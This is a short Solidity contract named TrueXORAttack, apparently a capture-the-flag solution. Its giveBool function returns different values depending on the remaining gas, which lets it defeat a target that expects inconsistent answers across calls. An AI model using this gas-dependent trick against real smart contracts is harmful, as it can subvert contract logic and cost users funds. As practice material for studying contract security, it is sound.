// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract TrueXORAttack {
    function giveBool() external view returns (bool) {
        if(gasleft() < 1400) return true;
        else return false;
    }
}